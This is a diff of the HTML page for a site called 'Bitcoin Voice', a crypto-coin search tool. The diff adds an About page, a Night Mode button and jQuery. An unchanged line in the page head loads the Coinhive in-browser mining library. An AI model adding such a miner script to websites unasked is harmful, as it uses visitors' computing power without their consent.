@@ -1,31 +1,37 @@
 <!DOCTYPE html>
 <head>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="/js.js"></script>
 <link   rel="stylesheet"    type="text/css"     href="/css.css"/>
 <link   rel="shortcut icon" type="image/x-icon" href="/webfavicon.ico"/>
 <title>Bitcoin Voice</title>
 </head>
-
-<body onload="setupPage();">
-<h1 id="title">Bitcoin Voice</h1>
-<h2 id="tagline"></h2>
-<table class="center" style="width:100%">
-  <tr>
-    <td id="bch" class="coin" onclick="selectCoin('bch', event=true)">Bitcoin Cash</td> 
-    <td id="btc" class="coin" onclick="selectCoin('btc', event=true)">Bitcoin</td>
-  </tr>
-</table>
-<table class="center" style="width:90%">
-  <tr>
-    <td><label class="inputLabel">Rows:&nbsp;</label><input onblur="populateLabels()" id="rowsCount" type="number"><input type="button" class="smallButton" style="float:left" value="Clear" onclick="setupPage()"></td>
-  </tr>
-  <tr>
-    <td><label class="inputLabel">Time Period:&nbsp;</label><select id="timePeriod" onblur="populateLabels()"></td>
-  </tr>
-</table>
-<input type="text" id="searchBar" onenter="populateLabels()" onblur="populateLabels()">
-<br><br>
-<table class="center" id="labelTable"></table><br>
-<button onclick="populateLabels(extend=true)" class="smallButton">Show more results</button>
+<body id="body" onload="setupPage();">
+  <div id="aboutPage" style="display: none; margin-right: auto; margin-left: auto;">
+    <input type="button" class="smallButton pageSwapButton" onclick="pageSwap()" value="Back">
+  </div>
+  <div id="mainPage" style="width: 60%; margin-right: auto; margin-left: auto;">
+    <h1 id="title">Bitcoin Voice</h1>
+    <h2 id="tagline"></h2>
+    <input type="button" class="smallButton pageSwapButton" onclick="pageSwap()" value="About">
+    <table class="center" style="width:100%">
+      <tr>
+        <td id="bch" class="coin" onclick="selectCoin('bch', event=true)">Bitcoin Cash</td> 
+        <td id="btc" class="coin" onclick="selectCoin('btc', event=true)">Bitcoin</td>
+      </tr>
+    </table>
+    <table class="center" style="width:100%">
+      <tr>
+        <td><label class="inputLabel">Rows:&nbsp;</label><input onblur="populateLabels()" id="rowsCount" type="number"><input type="button" class="smallButton" style="float:left" value="Clear" onclick="setupPage()"><input type="button" id="sunChange" class="smallButton" style="float:right;" value="Night Mode" onclick="sunChange()"></td>
+      </tr>
+      <tr>
+        <td><label class="inputLabel">Time Period:&nbsp;</label><select id="timePeriod" onblur="populateLabels()"></td>
+      </tr>
+    </table>
+    <input type="text" id="searchBar" onenter="populateLabels()" style="width: 90%; margin-right: auto; margin-left: auto;" onblur="populateLabels()">
+    <br><br><br>
+    <table class="center" id="labelTable" style="width:100%"></table><br>
+    <button onclick="populateLabels(extend=true)" class="smallButton">Show more results</button>
+  </div>
 </body>
